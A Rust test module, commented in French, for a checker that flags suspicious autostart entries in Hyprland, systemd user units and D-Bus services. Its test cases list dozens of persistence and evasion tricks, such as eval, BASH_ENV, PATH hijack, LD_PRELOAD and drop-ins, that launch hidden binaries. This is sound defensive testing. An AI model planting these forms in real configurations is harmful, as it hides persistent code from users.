    /// fichier de plus, change ce qui se lit (« et 56 autre(s) » cachait la 63e).
    #[test]
    fn lignes_en_trop_groupees_par_fichier() {
        use std::fmt::Write as _;
        assert_eq!(fichier_signale("~/a.lua:12 : hl.exec_cmd(…)"), Some("~/a.lua"));
        assert_eq!(fichier_signale("~/a:b.conf:3 : exec-once = x"), Some("~/a:b.conf"));
        assert_eq!(fichier_signale("~/.config/hypr est un lien vers ~/z"), None);
        let suite: Vec<String> = ["~/b.lua:1 : x", "~/a.lua:2 : y", "~/a.lua:3 : z", "source borne"]
            .into_iter()
            .map(str::to_string)
            .collect();
        assert_eq!(reste_par_fichier(&suite), "~/a.lua (2), ~/b.lua (1), source borne");
        let m = Maison::nouvelle("relecture2-groupe");
        let mut a = String::new();
        for i in 0..8 {
            let _ = writeln!(a, "exec-once = /tmp/.x/a{i}");
        }
        m.ecrire(".config/hypr/a.conf", &a);
        m.ecrire(".config/hypr/b.conf", "exec-once = /tmp/.x/b\n");
        let c = m.lancements();
        leve(&c, "groupe");
        assert!(
            c.message.contains("Lancement automatique suspect (9 ligne(s))"),
            "{}",
            c.message
        );
        assert!(c.message.contains("et 3 autre(s), par fichier : "), "{}", c.message);
        for f in ["~/.config/hypr/a.conf", "~/.config/hypr/b.conf"] {
            assert!(c.message.contains(f), "{f} : {}", c.message);
        }
    }

    /// Vérification 2, mineurs : un service D-Bus de la session écrit par le compte se juge comme une unité, jamais
    /// déclarable ; une variable qui change les dossiers d'unités de systemd est refusée.
    #[test]
    fn service_dbus_et_dossiers_de_systemd() {
        for (i, (fichier, texte)) in [
            (
                ".local/share/dbus-1/services/org.example.Rappel.service",
                "[D-BUS Service]\nName=org.example.Rappel\nExec=/home/alice/.x/agent\n",
            ),
            (
                ".local/share/dbus-1/services/org.example.Rappel.service",
                "[D-BUS Service]\nName=org.example.Rappel\nExec=/tmp/.x/agent --bus\n",
            ),
            (
                ".config/systemd/user.conf",
                "[Manager]\nManagerEnvironment=SYSTEMD_UNIT_PATH=/tmp/.x:\n",
            ),
            (
                ".config/environment.d/a.conf",
                "SYSTEMD_GENERATOR_PATH=/home/alice/.g\n",
            ),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("relecture2-mineur-{i}"));
            m.ecrire(fichier, texte);
            let c = m.lancements();
            leve_non_declarable(&c, texte);
            assert!(
                c.message.contains(&format!("~/{fichier}:")),
                "{texte:?} : {}",
                c.message
            );
        }
        // Sous un XDG_DATA_HOME déplacé aussi.
        let m = Maison::nouvelle("relecture2-mineur-donnees");
        m.ecrire(
            ".donnees/dbus-1/services/org.example.Rappel.service",
            "[D-BUS Service]\nName=org.example.Rappel\nExec=/tmp/.x/agent\n",
        );
        leve_non_declarable(
            &m.lancements_avec(&[("XDG_DATA_HOME", "/home/alice/.donnees")]),
            "XDG_DATA_HOME",
        );
        // Un service ordinaire ne lève rien.
        let m = Maison::nouvelle("relecture2-mineur-sain");
        m.ecrire(
            ".local/share/dbus-1/services/org.freedesktop.Notifications.service",
            "[D-BUS Service]\nName=org.freedesktop.Notifications\nExec=/usr/bin/mako\n",
        );
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
    }

    // ---- Vérification 3 : la liste permise. Chaque cas des trois rapports (S1-S15, P1-P11, H1-H5), valeurs
    // inventées ; « X » = un dossier caché de la maison ou /tmp/.x. ----

    /// Une chaîne Lua entre guillemets doubles.
    fn chaine_lua(texte: &str) -> String {
        format!("\"{}\"", texte.replace('\\', "\\\\").replace('"', "\\\""))
    }

    /// Cette ligne de shell, lancée au démarrage par Hyprland (« exec-once = » d'un .conf, puis « hl.exec_cmd » d'un
    /// fichier Lua), est levée au niveau élevé et jamais déclarable.
    fn shell_leve_partout(nom: &str, ligne: &str) {
        let m = Maison::nouvelle(&format!("{nom}-conf"));
        m.ecrire(".config/hypr/hyprland.conf", &format!("exec-once = {ligne}\n"));
        leve_non_declarable(&m.lancements(), &format!("conf : {ligne}"));
        let m = Maison::nouvelle(&format!("{nom}-lua"));
        m.ecrire(
            ".config/hypr/hyprland.lua",
            &format!("hl.exec_cmd({})\n", chaine_lua(ligne)),
        );
        leve_non_declarable(&m.lancements(), &format!("lua : {ligne}"));
    }

    /// Le rapport « shell » (S1 à S15) : chaque forme qu'il a trouvée muette, avec un chemin caché ou temporaire.
    const CAS_SHELL: &[&str] = &[
        // S1 : un chemin relatif derrière un lanceur ou un interpréteur, depuis le dossier courant ou la maison.
        "cd ~/.x && exec ./a",
        "cd /tmp/.x; sh ./a.sh",
        "cd /tmp/.x; nohup ./a",
        "{ cd /tmp/.x; exec ./a; }",
        "sh .x/a.sh",
        "exec .x/a",
        "env .x/a",
        ". .x/a",
        "BASH_ENV=.x/a bash -c true",
        // S2 : un « cd » annulé ou caché.
        "(cd /tmp/.x); ./a",
        "builtin cd /tmp/.x; ./a",
        "command cd /tmp/.x; ./a",
        "pushd /tmp/.x; ./a",
        "false && cd /opt; ./a",
        // S3 : HOME, PATH, BASH_ENV posés autrement.
        "HOME=/tmp/.x; ~/a",
        "HOME=/tmp/.x; cd; ./a",
        "HOME=/tmp/.x sh -c '~/a'",
        "export PATH=/tmp/.x:$PATH; a",
        "PATH+=:/tmp/.x; a",
        "typeset PATH=/tmp/.x; a",
        "export BASH_ENV=/tmp/.x/a; bash -c true",
        // S4 : « -c » après des options à valeur.
        "bash -O extglob -c '/tmp/.x/a'",
        "bash -o posix -c '~/.x/a'",
        "bash --rcfile ~/.x/r -c true",
        "bash --init-file ~/.x/r -c true",
        "bash -c -- '~/.x/a'",
        "bash -c -x '~/.x/a'",
        "bash +B -c '~/.x/a'",
        "env -S '~/.x/a'",
        // S5 : eval, trap et les commandes internes qui exécutent.
        "eval 'cd /tmp/.x; ./a'",
        "sh -c 'eval \"~/.x/a\"'",
        "trap '~/.x/a' EXIT",
        "builtin eval ~/.x/a",
        "builtin exec ~/.x/a",
        "hash -p ~/.x/a a; a",
        "mapfile -C ~/.x/a -c 1 < /etc/hostname",
        "alias a=~/.x/a",
        // S6 : un interpréteur nourri par son entrée.
        "echo ~/.x/a | sh",
        "cat ~/.x/a | bash -s",
        "sh < .x/a",
        "cd /tmp/.x; sh < a",
        "sh <<< '~/.x/a'",
        "exec 3<.x/a; sh /dev/fd/3",
        "echo ~/.x/a | xargs sh -c",
        // S7 : joker ou accolades dans un mot relatif ou un argument.
        "cd /; t?p/.x/a",
        "prlimit --nofile=1 /tmp/.x/a?",
        "setarch x86_64 /tmp/.x/{a,}",
        // S8 : accolades et parenthèses comptées autrement que le shell.
        "${A:-{}; ~/.x/a; echo }",
        "$((~/.x/a); (true))",
        // S9 : un dossier temporaire seul en argument.
        "env -C /tmp ./a",
        "env --chdir=/tmp ./a",
        "make -C ~/.x",
        "find /tmp -name a -exec '{}' ';'",
        "systemd-run --user --working-directory=/tmp ./a",
        "flatpak run --cwd=/tmp org.example.App",
        "xdg-terminal-exec --dir=/tmp",
        "kitty -d /tmp",
        // S10 : même verdict partout.
        "prlimit --nofile=1 /tmp/.x/a$Z",
        "set -- /tmp/.x/a; eval \"$1\"",
        "f() { \"$1\"; }; f ~/.x/a",
        // S11 : hyprctl qui lance autrement que « dispatch exec ».
        "hyprctl dispatch execr '~/.x/a; true'",
        "hyprctl dispatch -- exec ~/.x/a",
        "hyprctl --batch 'dispatch exec ~/.x/a'",
        "hyprctl keyword exec-once ~/.x/a",
        // S12 : enveloppes inconnues.
        "footclient ~/.x/a",
        "run0 ~/.x/a",
        "swaymsg exec ~/.x/a",
        "dex ~/.x/a.desktop",
        "unbuffer ~/.x/a",
        "watchexec ~/.x/a",
        // S13 : code en ligne d'un interpréteur.
        "python3 -c 'import os; os.system(\"/tmp/.x/a\")'",
        "perl -e 'system(q(/tmp/.x/a))'",
        "awk 'BEGIN{system(\"/tmp/.x/a\")}'",
    ];

    /// Les mêmes formes sans aucun dossier caché ni temporaire écrit : seule la liste permise les lève (le filet
    /// n'y voit rien). Chemin construit, variable, forme du shell, lanceur ou programme inconnus : « non lue ».
    const CAS_SANS_FILET: &[&str] = &[
        "cd /opt/y && exec a",
        "eval \"$(printf '%s' /opt/y/a)\"",
        "bash -O extglob -c 'a'",
        "echo a | sh",
        "sh <<< 'a'",
        "trap 'b' EXIT",
        "HOME=/opt/y; ~/a",
        "export PATH=/opt/y:$PATH; a",
        "prlimit --nofile=1 /opt/y/a?",
        "setarch x86_64 /opt/y/{a,}",
        "hyprctl keyword exec-once a",
        "hyprctl --batch 'dispatch exec a'",
        "python3 -c 'import os; os.system(chr(47) + \"opt/a\")'",
        "perl -e 'system(q(a))'",
        "awk 'BEGIN{system(\"a\")}'",
        "programme-inconnu --x",
        "a=$(printf /opt/y/a); $a",
        "run0 /opt/y/a",
        "env -i /opt/y/a",
        "sh -c \"$A\"",
    ];

    #[test]
    fn verification_3_shell_leve_partout() {
        for (i, ligne) in CAS_SHELL.iter().chain(CAS_SANS_FILET).enumerate() {
            shell_leve_partout(&format!("v3-shell-{i}"), ligne);
        }
    }

    /// S15 : une ligne plus longue que `permise::LIGNE_MAX` n'est pas lue ; levée, jamais muette, en peu de temps.
    #[test]
    fn verification_3_ligne_geante_levee() {
        let debut = std::time::Instant::now();
        let geante = format!("true {}", "a ".repeat(permise::LIGNE_MAX));
        shell_leve_partout("v3-geante", &geante);
        let accolades = format!("true {}", "{ ".repeat(150_000));
        shell_leve_partout("v3-accolades", &accolades);
        let suite = "true; ".repeat(20_000);
        shell_leve_partout("v3-suite", &suite);
        assert!(
            debut.elapsed() < std::time::Duration::from_secs(30),
            "{:?}",
            debut.elapsed()
        );
    }

    /// Les deux mécanismes, chacun seul (preuve par mutation : couper l'un fait tomber ses essais). Le filet voit
    /// tout dossier temporaire ou caché écrit, quelle que soit la forme ; la liste permise refuse toute forme qu'elle
    /// ne reconnaît pas, sans dossier caché écrit.
    #[test]
    fn verification_3_filet_et_liste_permise_seuls() {
        let m = Maison::nouvelle("v3-mecanismes");
        let maison = m.racine.join("home/alice").to_string_lossy().into_owned();
        let maisons = [maison.as_str()];
        let s = permise::Systeme {
            racine: &m.racine,
            maison: &maison,
            maisons: &maisons,
            courant: None,
            noms_des_lieux: std::cell::OnceCell::new(),
            relatif: std::cell::OnceCell::new(),
        };
        // Chaque cas des rapports, levé par les deux mécanismes à la fois ; le joker « t?p » seul échappe au filet
        // (le chemin n'est pas écrit) : la liste permise le refuse.
        for ligne in CAS_SHELL {
            assert!(
                permise::filet(ligne, false, &maisons) || *ligne == "cd /; t?p/.x/a",
                "filet : {ligne}"
            );
            assert!(permise::ligne_shell(&s, ligne).is_err(), "liste permise : {ligne}");
        }
        for (texte, systemd) in [
            ("/var/run/user/1000/a", true),
            ("/proc/self/task/1/root/tmp/a", true),
            ("/proc/self/cwd/a", true),
            ("%t/a", true),
            ("%T/a", true),
            ("/dev/shm/a", false),
            ("--working-directory=/tmp", false),
            ("$HOME/.x/a", false),
        ] {
            assert!(permise::filet(texte, systemd, &maisons), "filet : {texte}");
        }
        for ligne in CAS_SANS_FILET {
            assert!(!permise::filet(ligne, false, &maisons), "filet inattendu : {ligne}");
            assert!(permise::ligne_shell(&s, ligne).is_err(), "liste permise : {ligne}");
        }
        for ligne in LIGNES_COURANTES {
            assert!(!permise::filet(ligne, false, &maisons), "filet : {ligne}");
            assert_eq!(permise::ligne_shell(&s, ligne), Ok(()), "{ligne}");
        }
    }

    /// Trente lignes de démarrage courantes, inventées : aucune n'est levée (ni « non lue »), en .conf comme en Lua.
    const LIGNES_COURANTES: &[&str] = &[
        "uwsm app -- firefox",
        "uwsm-app -- kitty",
        "uwsm app -- obsidian",
        "waybar",
        "hypridle",
        "mako",
        "swayosd-server",
        "fcitx5 -d",
        "nm-applet --indicator",
        "1password --silent",
        "flatpak run com.discordapp.Discord --start-minimized",
        "steam -silent",
        "nautilus --gapplication-service",
        "firefox --new-window https://example.org",
        "kitty --class=notes",
        "xsetroot -cursor_name left_ptr",
        "systemctl --user start hyprpolkitagent",
        "dbus-update-activation-environment --systemd --all",
        "wl-paste --type text --watch cliphist store",
        "hyprctl setcursor Bibata-Modern-Classic 24",
        "gsettings set org.gnome.desktop.interface color-scheme prefer-dark",
        "swaybg -i /usr/share/backgrounds/salon.png -m fill",
        "blueman-applet",
        "udiskie --tray",
        "easyeffects --gapplication-service",
        "playerctld daemon",
        "setsid uwsm app -- obsidian",
        "nohup syncthing serve --no-browser",
        "gamemoderun steam",
        "sleep 2 && waybar",
    ];

    #[test]
    fn lignes_courantes_muettes() {
        assert_eq!(LIGNES_COURANTES.len(), 30);
        let m = Maison::nouvelle("v3-courantes-conf");
        let conf = LIGNES_COURANTES
            .iter()
            .fold(String::new(), |t, l| t + "exec-once = " + l + "\n");
        m.ecrire(".config/hypr/hyprland.conf", &conf);
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
        let m = Maison::nouvelle("v3-courantes-lua");
        let lua = LIGNES_COURANTES
            .iter()
            .fold(String::new(), |t, l| t + "hl.exec_cmd(" + &chaine_lua(l) + ")\n");
        m.ecrire(".config/hypr/hyprland.lua", &lua);
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
    }

    /// Vérification 3 : la configuration de départ d'Omarchy (/usr/share/omarchy/config, copiée dans ~/.config à
    /// l'installation), avec son dossier « default » dans la racine jetable, ne lève rien : la liste permise couvre
    /// ce que la distribution pose elle-même. Sauté là où Omarchy n'est pas installé.
    #[test]
    fn gabarits_d_omarchy_muets() {
        fn copier(de: &std::path::Path, vers: &std::path::Path) {
            for e in std::fs::read_dir(de).unwrap().flatten() {
                let (chemin, cible) = (e.path(), vers.join(e.file_name()));
                let sorte = e.file_type().unwrap();
                if sorte.is_dir() {
                    std::fs::create_dir_all(&cible).unwrap();
                    copier(&chemin, &cible);
                } else if sorte.is_file() {
                    std::fs::copy(&chemin, &cible).unwrap();
                }
            }
        }
        let source = std::path::Path::new("/usr/share/omarchy");
        if !source.join("config/hypr").is_dir() {
            return crate::essais::saute("Omarchy n'est pas installé (/usr/share/omarchy/config/hypr absent)");
        }
        let m = Maison::nouvelle("v3-gabarits-omarchy");
        for dossier in ["hypr", "autostart"] {
            let vers = m.chemin(&format!(".config/{dossier}"));
            std::fs::create_dir_all(&vers).unwrap();
            copier(&source.join("config").join(dossier), &vers);
        }
        let defaut = m.racine.join("usr/share/omarchy/default");
        std::fs::create_dir_all(&defaut).unwrap();
        copier(&source.join("default"), &defaut);
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
    }

    /// Cette unité du compte (avec ses fichiers en plus) est levée au niveau élevé et jamais déclarable.
    fn unite_levee(nom: &str, fichiers: &[(&str, &str)]) {
        let m = Maison::nouvelle(nom);
        for (f, texte) in fichiers {
            m.ecrire(f, texte);
        }
        leve_non_declarable(&m.lancements(), &format!("{fichiers:?}"));
    }

    /// Le rapport « systemd » (P1 à P11).
    #[test]
    fn verification_3_unites_levees() {
        const U: &str = ".config/systemd/user/x.service";
        let gros = format!("A=b\n{}", "# rien\n".repeat(200_000));
        for (i, fichiers) in [
            // P1 : le script donné en entrée d'un shell.
            vec![(
                U,
                "[Service]\nStandardInput=data\nStandardInputText=echo a\nExecStart=/bin/sh\n",
            )],
            vec![(
                U,
                "[Service]\nStandardInput=data\nStandardInputData=ZWNobyBh\nExecStart=/bin/sh\n",
            )],
            vec![(U, "[Service]\nStandardInput=file:/opt/y/a\nExecStart=/bin/sh\n")],
            // P2 : une variable posée hors de [Service], que systemd ignore.
            vec![(
                U,
                "[Service]\nEnvironment=A=/tmp/.x/a\nExecStart=/bin/sh -c ${A}\n[Unit]\nEnvironment=A=/usr/bin/true\n",
            )],
            vec![(
                U,
                "[Service]\nExecStart=/bin/sh -c ${A}\n[X-Leurre]\nEnvironment=A=/usr/bin/true\n",
            )],
            // P3 : la valeur finale indéterminée ou posée localement.
            vec![(U, "[Service]\nEnvironment=HOME=/tmp/.x\nExecStart=/bin/sh $HOME/a\n")],
            vec![(U, "[Service]\nEnvironment=HOME=/opt/y\nExecStart=/bin/sh $HOME/a\n")],
            vec![(U, "[Service]\nEnvironment=A=%t/a\nExecStart=/bin/sh ${A}\n")],
            vec![(U, "[Service]\nEnvironment=A=/opt B=${A}/x\nExecStart=/bin/sh ${B}\n")],
            vec![(U, "[Service]\nExecStart=/bin/sh ${INCONNUE}\n")],
            // P4 : un chemin relatif lu depuis la maison.
            vec![(U, "[Service]\nExecStart=/bin/sh .x/a.sh\n")],
            vec![(
                U,
                "[Service]\nEnvironment=LD_LIBRARY_PATH=.x\nExecStart=/usr/bin/true\n",
            )],
            vec![(
                U,
                "[Service]\nEnvironment=PYTHONPATH=.x\nExecStart=/usr/bin/python3 -m a\n",
            )],
            vec![(U, "[Service]\nEnvironment=BASH_ENV=.x/e\nExecStart=/bin/bash -c true\n")],
            // P5 : un fichier de variables à joker, coupé par une continuation, trop gros, illisible.
            vec![(U, "[Service]\nEnvironmentFile=%h/v.en?\nExecStart=/usr/bin/true\n")],
            vec![
                (U, "[Service]\nEnvironmentFile=%h/v.env\nExecStart=/bin/bash -c true\n"),
                ("v.env", "BASH_ENV=\\\n/tmp/.x/e\n"),
            ],
            vec![
                (U, "[Service]\nEnvironmentFile=%h/v.env\nExecStart=/usr/bin/true\n"),
                ("v.env", gros.as_str()),
            ],
            // P7 : les autres noms d'un dossier temporaire ou du dossier courant.
            vec![(U, "[Service]\nExecStart=/proc/self/task/1/root/tmp/a\n")],
            vec![(U, "[Service]\nExecStart=/proc/self/cwd/a\n")],
            vec![(U, "[Service]\nExecStart=/dev/mqueue/a\n")],
            // P8 : l'ajout (drop-in) fusionné à l'unité.
            vec![
                (U, "[Service]\nExecStart=/bin/sh ${A}\n"),
                (
                    ".config/systemd/user/x.service.d/o.conf",
                    "[Service]\nEnvironment=A=/tmp/.x/a\n",
                ),
            ],
            vec![
                (U, "[Service]\nExecStart=/usr/bin/true\n"),
                (
                    ".config/systemd/user/x.service.d/o.conf",
                    "[Service]\nEnvironment=LD_PRELOAD=/opt/y/l.so\n",
                ),
            ],
            // P9 : une dépendance vers une instance de gabarit, un chemin ou un code.
            vec![(
                U,
                "[Unit]\nWants=wayland-wm@-tmp-.x-a.service\n[Service]\nExecStart=/usr/bin/true\n",
            )],
            vec![(
                ".config/systemd/user/x.timer",
                "[Timer]\nOnBootSec=1\nUnit=a@b.service\n",
            )],
            vec![(
                U,
                "[Unit]\nOnFailure=%n-x.service\n[Service]\nExecStart=/usr/bin/true\n",
            )],
            // P11 : les variables qui lancent un programme ; le bus par « unixexec: ».
            vec![(
                U,
                "[Service]\nEnvironment=DBUS_SESSION_BUS_ADDRESS=unixexec:path=/opt/y/a\nExecStart=/usr/bin/true\n",
            )],
            vec![(
                U,
                "[Service]\nEnvironment=SSH_ASKPASS=~/.x/a\nExecStart=/usr/bin/true\n",
            )],
            vec![(
                U,
                "[Service]\nEnvironment=GIT_SSH_COMMAND=$A\nExecStart=/usr/bin/true\n",
            )],
            vec![(
                U,
                "[Service]\nEnvironment=GAMEMODERUNEXEC=a b\nExecStart=/usr/bin/true\n",
            )],
            // Une clé inconnue de la liste.
            vec![(U, "[Service]\nExecStart=/usr/bin/true\nCleInventee=1\n")],
        ]
        .into_iter()
        .enumerate()
        {
            unite_levee(&format!("v3-unite-{i}"), &fichiers);
        }
        // P7 : les autres noms d'un dossier temporaire se lisent comme /tmp : levés pour cette raison, et, comme
        // « ExecStart=/tmp/.x/a », déclarables seulement liés au fichier lancé (son contenu ou son absence).
        for (i, l) in ["/var/run/user/1000/a", "/run/lock/a", "/var/lock/a"]
            .into_iter()
            .enumerate()
        {
            let m = Maison::nouvelle(&format!("v3-unite-temporaire-{i}"));
            m.ecrire(U, &format!("[Service]\nExecStart={l}\n"));
            let c = m.lancements();
            leve(&c, l);
            assert!(c.message.contains("temporaire"), "{l} : {}", c.message);
        }
    }

    /// P6 : les services D-Bus du dossier de la session, lus en premier par le bus.
    #[test]
    fn verification_3_service_dbus_de_la_session() {
        let m = Maison::nouvelle("v3-dbus-session");
        m.ecrire_hors(
            "/run/user/1000/dbus-1/services/org.example.A.service",
            "[D-BUS Service]\nName=org.example.A\nExec=/tmp/.x/a\n",
        );
        leve_non_declarable(&m.lancements(), "dbus de la session");
    }

    /// P10 : user.conf avec des blancs autour du « = ».
    #[test]
    fn verification_3_user_conf_a_blancs() {
        for (i, ligne) in [
            "DefaultEnvironment = LD_PRELOAD=/opt/y/l.so",
            "DefaultEnvironment\t=LD_PRELOAD=/opt/y/l.so",
            "ManagerEnvironment =BASH_ENV=/tmp/.x/e",
        ]
        .into_iter()
        .enumerate()
        {
            assert!(variable_de_configuration(ligne, &["/home/alice"]).is_some(), "{ligne}");
            let m = Maison::nouvelle(&format!("v3-user-conf-{i}"));
            m.ecrire(".config/systemd/user.conf", &format!("[Manager]\n{ligne}\n"));
            leve(&m.lancements(), ligne);
        }
    }

    /// H1 à H4 : ce qu'Omarchy et Lua chargent vraiment.
    #[test]
    fn verification_3_lua_charge_vraiment() {
        const LANCE: &str = "hl.exec_cmd(\"/tmp/.x/a\")\n";
        // H1 : un fichier nommé « .lua » (require("") le charge).
        for d in [
            ".local/state/omarchy/toggles/hypr",
            ".local/state/omarchy/workspace-layouts",
        ] {
            let m = Maison::nouvelle("v3-h1");
            m.ecrire(&format!("{d}/.lua"), LANCE);
            leve_non_declarable(&m.lancements(), d);
        }
        // H2 : « a.b.lua » fait charger a/b.lua d'ailleurs ; le fichier jugé n'est pas celui qui est chargé.
        for d in [
            ".local/state/omarchy/toggles/hypr",
            ".local/state/omarchy/workspace-layouts",
        ] {
            let m = Maison::nouvelle("v3-h2");
            m.ecrire(&format!("{d}/a.b.lua"), "-- rien\n");
            m.ecrire(".local/state/a/b.lua", LANCE);
            let refus = leve_non_declarable(&m.lancements(), d);
            assert!(refus.contains("a.b.lua"), "{refus}");
        }
        // H3 : les raccourcis du moteur de dictée choisi ; un nom de moteur refusé par Omarchy n'est pas chargé.
        let m = Maison::nouvelle("v3-h3");
        m.ecrire(".config/omarchy/defaults/dictation", "  voxessai \n");
        m.ecrire(".config/voxessai/shortcuts.lua", LANCE);
        leve_non_declarable(&m.lancements(), "dictée");
        assert_eq!(
            raccourcis_de_dictee(&m.chemin(".config")),
            Some(m.chemin(".config/voxessai/shortcuts.lua"))
        );
        m.ecrire(".config/omarchy/defaults/dictation", "Vox\n");
        m.ecrire(".config/Vox/shortcuts.lua", LANCE);
        assert_eq!(raccourcis_de_dictee(&m.chemin(".config")), None);
        m.ecrire(".config/omarchy/defaults/dictation", "-x\n");
        assert_eq!(raccourcis_de_dictee(&m.chemin(".config")), None);
        // H4 : une 1re ligne « # » sautée par Lua ; avec la marque d'ordre des octets aussi.
        for (i, texte) in [
            "#!/x --[[\nhl.exec_cmd(\"/tmp/.x/a\")\n-- ]]\n",
            "\u{feff}# --[[\nhl.exec_cmd(\"/tmp/.x/a\")\n-- ]]\n",
            "#--[==[\rhl.exec_cmd(\"/tmp/.x/a\")\n",
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("v3-h4-{i}"));
            m.ecrire(".config/hypr/hyprland.lua", texte);
            let c = m.lancements();
            leve_non_declarable(&c, texte);
            assert!(c.message.contains("hyprland.lua:2"), "{texte:?} : {}", c.message);
        }
        // Le nom à point ailleurs (un module ordinaire de ~/.config/hypr) ne change rien.
        let m = Maison::nouvelle("v3-h2-ailleurs");
        m.ecrire(".config/hypr/a.b.lua", "-- rien\n");
        assert_eq!(m.lancements().probleme, None);
    }

    /// Un appel Lua de lancement n'est reconnu que si son argument est une chaîne littérale qui passe la liste
    /// permise : une chaîne construite, une variable, un appel imbriqué sont « non lue ».
    #[test]
    fn verification_3_appel_lua_litteral_seulement() {
        for (i, texte) in [
            "local function f(c)\n  hl.exec_cmd(c)\nend\nf(\"waybar\")\n",
            "hl.exec_cmd(io.read())\n",
            "hl.exec_cmd(string.format(\"%s\", \"waybar\"))\n",
            "hl.exec_cmd(os.getenv(\"A\"))\n",
            // La valeur se retrouverait (un nom posé, « $HOME ») : pas en toutes lettres, donc non lue.
            "local t = \"kitty\"\nhl.exec_cmd(t)\n",
            "local t = \"kitty\"\nhl.bind(\"SUPER + Q\", hl.dsp.exec_cmd(t))\n",
            "hl.exec_cmd(os.getenv(\"HOME\") .. \"/bin/a\")\n",
            "local c = \"browser\"\no.bind(\"SUPER + B\", \"Navigateur\", { omarchy = c })\n",
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("v3-lua-litteral-{i}"));
            m.ecrire(".config/hypr/hyprland.lua", texte);
            leve_non_declarable(&m.lancements(), texte);
        }
        // En toutes lettres : muet (chaînes jointes, répartiteur, règles de fenêtre, table d'Omarchy).
        let m = Maison::nouvelle("v3-lua-litteral-muet");
        m.ecrire(
            ".config/hypr/hyprland.lua",
            "hl.exec_cmd(\"kitty\" .. \" --class=notes\")\n\
             hl.exec_cmd(\"kitty\", { workspace = \"2 silent\" })\n\
             hl.bind(\"SUPER + Q\", hl.dsp.exec_cmd(\"kitty\"), { repeating = true })\n\
             o.bind(\"SUPER + M\", \"Menu\", { menu = \"power\" })\n\
             o.bind(\"SUPER + W\", \"Web\", o.launch_webapp(\"https://example.org\"))\n\
             local p = io.popen(\"waybar --version 2>/dev/null\", \"r\")\n",
        );
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
    }
}
